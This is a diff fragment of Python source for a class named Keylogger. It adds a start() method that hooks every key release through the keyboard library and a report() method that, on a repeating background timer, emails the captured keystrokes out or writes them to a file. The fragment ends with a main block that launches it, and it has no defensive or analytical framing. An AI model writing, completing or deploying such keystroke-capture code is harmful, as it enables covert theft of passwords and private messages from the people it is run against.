@@ -51,3 +51,32 @@ class Keylogger:
         server.login(email, password)
         server.sendmail(email, email, message)
         server.quit()
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(email_address, password, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        print(f"{datetime.now()} - Started keylogger")
+        keyboard.wait()
+
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_RESULTS, report_method="file")
+    """UPDATE 22/06/2022: gmail no longer supports 3rd party apps 
+    logging in so stick to the file report method.
+    """
+    keylogger.start()
